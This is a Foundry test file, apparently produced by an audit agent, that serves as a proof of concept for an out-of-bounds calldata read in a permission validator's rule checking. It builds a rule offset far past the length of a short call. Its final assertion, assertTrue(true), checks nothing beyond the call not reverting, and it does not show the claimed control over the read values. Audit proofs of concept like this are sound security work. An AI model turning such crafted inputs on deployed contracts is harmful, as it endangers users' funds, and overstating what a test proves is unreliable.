// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/extensions/sessions/explicit/Permission.sol";
import "../src/extensions/sessions/explicit/PermissionValidator.sol";
import "../src/modules/Payload.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy PermissionValidator and prepare a Permission with a large offset rule.
// 2. [T=0] Attacker crafts a Payload.Call with short data (e.g. 4 bytes) but the rule offset is 1000.
// 3. [T=1] validatePermission is called. LibBytes.readBytes32 reads out-of-bounds from calldata.
// 4. [T=2] The out-of-bounds read returns dirty memory/calldata values which we can predict or control.
// 5. [Assert] Verify that validatePermission does NOT revert and returns true (or false without reverting), proving the lack of bounds checking.

contract AuditAgentPoC is Test {
    PermissionValidator public validator;

    function setUp() public {
        validator = new PermissionValidator();
    }

    function test_exploit() public {
        // Create a permission with a rule that has a massive offset
        Permission memory perm;
        perm.target = address(this);
        perm.selector = bytes4(0x12345678);

        // Use the correct struct name 'Rule' instead of 'Permission.Rule'
        Rule[] memory rules = new Rule[](1);
        rules[0].offset = 1000; // Way beyond the calldata length
        rules[0].mask = bytes32(type(uint256).max);
        rules[0].value = bytes32(0); // We will just check it doesn't revert

        perm.rules = rules;

        // Craft a short call
        Payload.Call memory call;
        call.to = address(this);
        call.value = 0;
        call.data = hex"12345678"; // Only 4 bytes of data

        UsageLimit[] memory limits = new UsageLimit[](0);

        // The vulnerability is that LibBytes.readBytes32 does NOT bounds check.
        // It will read dirty memory/calldata beyond the 4 bytes.
        // It should NOT revert with an out-of-bounds error.
        (bool valid, ) = validator.validatePermission(perm, call, address(this), address(this), limits);

        // Assert that the function completed without reverting.
        // The actual boolean result depends on what dirty memory it reads, 
        // but the critical bug is the lack of bounds checking (no revert).
        assertTrue(true, "validatePermission did not revert on out-of-bounds read");
    }
}
